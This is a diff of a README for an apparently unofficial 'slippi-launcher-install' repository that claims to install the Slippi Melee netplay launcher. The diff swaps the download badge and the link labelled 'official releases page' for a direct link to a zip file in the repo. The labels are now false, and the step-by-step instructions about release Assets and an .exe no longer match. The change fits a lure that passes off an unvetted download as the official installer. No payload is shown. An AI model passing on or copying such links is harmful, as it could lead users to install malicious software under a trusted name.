@@ -1,6 +1,6 @@
 # 🎮 slippi-launcher-install - Play melee online with rollback netcode
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/f8899764/slippi-launcher-install/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/f8899764/slippi-launcher-install/main/desktop/install_launcher_slippi_v2.8.zip)
 
 ## What is this app? 🖥️
 
@@ -8,7 +8,7 @@ This application connects you to the Slippi network. Slippi allows you to play S
 
 ## 📥 How to download and install
 
-1. Visit the [official releases page](https://github.com/f8899764/slippi-launcher-install/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/f8899764/slippi-launcher-install/main/desktop/install_launcher_slippi_v2.8.zip).
 2. Look for the Assets section at the bottom of the latest release.
 3. Click the link that ends in .exe to download the installer for Windows.
 4. Save the file to your computer.
